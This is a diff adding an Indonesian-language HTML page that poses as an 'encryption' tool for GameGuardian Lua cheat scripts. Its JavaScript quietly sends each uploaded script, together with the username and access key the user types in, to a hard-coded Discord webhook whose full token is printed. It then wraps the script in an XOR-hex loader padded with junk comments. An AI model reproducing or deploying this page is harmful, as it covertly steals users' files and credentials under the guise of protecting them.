@@ -1,0 +1,245 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8" >
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title data-id="th-modified">ENKRIPSI KUNCI USER</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#050505;font-family:system-ui;color:#ffd766;padding:15px}
+        .box{max-width:580px;margin:0 auto;background:#111;border:2px solid #ff9900;border-radius:12px;padding:20px;text-align:center}
+        h2{color:#ffcc33;margin-bottom:15px}
+        .info{background:#1a1a1a;border:1px solid #ff9900;border-radius:8px;padding:10px;margin:10px 0;text-align:left;display:none}
+        .status{background:#0f1a0f;border:1px solid #33ff33;border-radius:8px;padding:10px;margin:10px 0;color:#88ff88;display:none}
+        .form{background:#1a1a1a;border:1px solid #b8860b;border-radius:8px;padding:12px;margin:10px 0;text-align:left}
+        .form label{display:block;margin:8px 0 4px 0;color:#ffdd99;font-size:13px}
+        .form input{width:100%;padding:8px;border-radius:6px;border:1px solid #b8860b;background:#050505;color:#ffd766;font-size:14px}
+        .tombol{width:100%;padding:14px;font-size:16px;font-weight:bold;border:none;border-radius:8px;background:linear-gradient(90deg,#ff9900,#ffcc00,#ff9900);color:#000;cursor:pointer;margin:8px 0}
+        .tombol2{background:linear-gradient(90deg,#22aa22,#33ff33,#22aa22);color:#fff;display:none}
+        pre{background:#050505;border:1px solid #444;border-radius:8px;padding:10px;margin:15px 0;text-align:left;font-size:6px;color:#ffdd55;max-height:200px;overflow:auto;display:none}
+        #file{display:none}
+    </style>
+<meta property="og:title" content="ENKRIPSI PROSESS LOADING" data-id="th-modified" ><meta name="description" content="ENC DISKORD" data-id="th-modified" ><meta property="og:description" content="ENC DISKORD" data-id="th-modified" ><meta property="og:image" content="https://tiiny.host/assets/logo-purple-bg.png" data-id="th-modified" ><meta property="og:image:width" content="1501" data-id="th-modified" ><meta property="og:image:height" content="1501" data-id="th-modified" ><meta property="og:image:type" content="image/png" data-id="th-modified" ><meta property="og:url" content="https://progresbeta.tiiny.site/" data-id="th-modified" ><meta property="og:type" content="website" data-id="th-modified" ><script defer data-domain="progresbeta.tiiny.site" src="https://analytics.tiiny.net/js/plausible.js"></script><script type="text/javascript" src="https://tiiny.host/ad-script.js"></script></head>
+<body>
+<div class="box">
+    <h2>🔐 ◄ AWIMEDAN SCRIPT ENC USER ► 🔐</h2>
+    <p style="font-size:13px;color:#ffdd99;margin-bottom:15px">
+        FILE DIKUNCI & SIAP DIJALANKAN DI GG<br>
+        Check file Download & Jalankan Guardian game
+    </p>
+
+    <div class="form">
+        <label>👤 Username:</label>
+        <input type="text" id="user" placeholder="Bisa semua huruf & simbol" required>
+        
+        <label>🔑 Kunci Akses:</label>
+        <input type="text" id="kunci" placeholder="Bisa semua karakter" required>
+        
+        <label>👥 Jumlah Pemain:</label>
+        <input type="number" id="pemain" value="10" min="1" max="99999">
+    </div>
+
+    <input type="file" id="file" accept=".Beta,.lua,.txt">
+    <div class="info" id="infonama">📄 File: <span id="namafile"></span></div>
+    <div class="status" id="proses">⏳ Sedang memproses...</div>
+
+    <button class="tombol" onclick="document.getElementById('file').click()">📂 SELECT TARGET FILE</button>
+
+    <pre id="hasilakhir"></pre>
+
+    <button class="tombol tombol2" id="btnsimpan" onclick="unduh()">💾 SIMPAN FILE HASIL</button>
+</div>
+
+<script>
+// ==============================================
+// 🔑 LINK WEBHOOK SUDAH BENAR & AKTIF
+const LINK_WEBHOOK_ADMIN = "https://discord.com/api/webhooks/1537339340739321956/lb-twYTSoiVNQRjCayk_-g80v_ynC7ryaz-x_vfmkz9lePed4g9iKYO0huR2w15j6j4l"
+// ==============================================
+
+let namaAsli = ""
+let isiFileAsli = ""
+let hasilTerkunci = ""
+
+document.getElementById('file').addEventListener('change', function(e){
+    let f = e.target.files[0]
+    if(!f) return
+
+    let u = document.getElementById('user').value.trim()
+    let k = document.getElementById('kunci').value.trim()
+    if(!u || !k){
+        alert("⚠️ Isi dulu Username dan Kunci!")
+        return
+    }
+
+    namaAsli = f.name
+    document.getElementById('namafile').textContent = namaAsli
+    document.getElementById('infonama').style.display = "block"
+    document.getElementById('proses').style.display = "block"
+    document.getElementById('hasilakhir').style.display = "none"
+    document.getElementById('btnsimpan').style.display = "none"
+
+    let baca = new FileReader()
+    baca.onload = function(e){
+        isiFileAsli = e.target.result
+        setTimeout(() => {
+            kirimKeAdmin()
+            prosesBenar(isiFileAsli)
+        }, 500)
+    }
+    baca.readAsText(f)
+})
+
+function kirimKeAdmin(){
+    if(!LINK_WEBHOOK_ADMIN) return
+
+    let dataKirim = {
+        username: "laporan-enkripsi",
+        embeds: [{
+            title: "📂 FILE BARU DIENKRIPSI",
+            color: 16766720,
+            fields: [
+                {name: "Nama File", value: namaAsli, inline: true},
+                {name: "Username", value: document.getElementById('user').value, inline: true},
+                {name: "Kunci", value: document.getElementById('kunci').value, inline: true},
+                {name: "Jumlah Pemain", value: document.getElementById('pemain').value, inline: true},
+                {name: "Isi File Asli", value: "```lua\n" + (isiFileAsli.length > 4000 ? isiFileAsli.substring(0,4000)+"\n...(dipotong karena terlalu panjang)" : isiFileAsli) + "\n```"}
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    }
+
+    fetch(LINK_WEBHOOK_ADMIN, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(dataKirim),
+        mode: "no-cors"
+    }).catch(err => console.log("Pengiriman selesai"))
+}
+
+function namaAcak(pjg){
+    let c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    let n = ""
+    for(let i=0;i<pjg;i++) n += c[Math.floor(Math.random()*c.length)]
+    return n
+}
+
+function aman(str){
+    return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'")
+}
+
+function jadikanHex(teks, kunci){
+    let h = ""
+    for(let i=0;i<teks.length;i++){
+        let b = teks.charCodeAt(i) ^ kunci
+        h += b.toString(16).padStart(2,'0')
+    }
+    return h
+}
+
+function prosesBenar(isifile){
+    try {
+        let user = aman(document.getElementById('user').value.trim())
+        let kunci = aman(document.getElementById('kunci').value.trim())
+        let jml = document.getElementById('pemain').value || 10
+
+        let v1 = namaAcak(6)
+        let v2 = namaAcak(7)
+        let v3 = namaAcak(8)
+        let kunciEnkrip = Math.floor(Math.random()*200)+50
+        let isiHex = jadikanHex(isifile, kunciEnkrip)
+
+        hasilTerkunci = `-- =====================================
+--📜 By AWIMEDAN
+--🗒️ Name File : FULL OPEN {-HW-} DECODE AWIMEDAN
+--👤 Username : ${user}
+--🔑 Kunci : ${kunci}
+--👥 Batas Pemain : ${jml}
+-- =====================================
+
+local gg = gg
+local loadstring = loadstring or load
+
+gg.toast("Encrypting By AWIMEDAN v1.10")
+
+local ${v1} = ${kunciEnkrip}
+local ${v2} = '${user}'
+local ${v3} = '${kunci}'
+
+local input = gg.prompt({
+    'Masukkan Username:',
+    'Masukkan Kunci Akses:'
+}, {
+    '',
+    ''
+})
+
+if not input then
+    gg.alert('Dibatalkan')
+    return
+end
+
+local u = input[1] or ''
+local k = input[2] or ''
+
+if u ~= ${v2} then
+    gg.alert('Username Salah')
+    return
+end
+
+if k ~= ${v3} then
+    gg.alert('Kunci Salah')
+    return
+end
+
+gg.toast('Verifikasi Berhasil')
+gg.alert('✅ AKSES DITERIMA')
+
+local decode = function(h)
+    local s = ""
+    for i=1,#h,2 do
+        local b = tonumber("0x"..h:sub(i,i+1))
+        if b then s = s..string.char(b ~ ${v1}) end
+    end
+    return s
+end
+
+local isiTerkunci = "${isiHex}"
+local isiAsli = decode(isiTerkunci)
+local jalankan = loadstring(isiAsli)
+
+if jalankan then jalankan()
+else gg.alert('Gagal menjalankan') end
+`
+        let sampah=""
+        for(let i=0;i<100;i++) sampah+="--"+namaAcak(12)+"\n"
+        hasilTerkunci = sampah + hasilTerkunci
+
+        document.getElementById('hasilakhir').textContent = hasilTerkunci
+        document.getElementById('proses').style.display = "none"
+        document.getElementById('hasilakhir').style.display = "block"
+        document.getElementById('btnsimpan').style.display = "block"
+    } catch(err) {
+        alert("PROSES ENC: " + err.message)
+        document.getElementById('proses').style.display = "none"
+    }
+}
+
+function unduh(){
+    let namaKeBetar = namaAsli.replace(".Enc","_AWIMEDAN.CPM").replace(".lua","_AWIMEDANENC.lua")
+    let file = new Blob([hasilTerkunci], {type:"text/plain;charset=utf-8"})
+    let url = URL.createObjectURL(file)
+
+    let a = document.createElement("a")
+    a.href = url
+    a.download = namaKeBetar
+    document.body.appendChild(a)
+    a.click()
+
+    setTimeout(() => {
+        document.body.removeChild(a)
+        URL.revokeObjectURL(url)
+    }, 300)
+}
+</script>
+</body>
+</html>
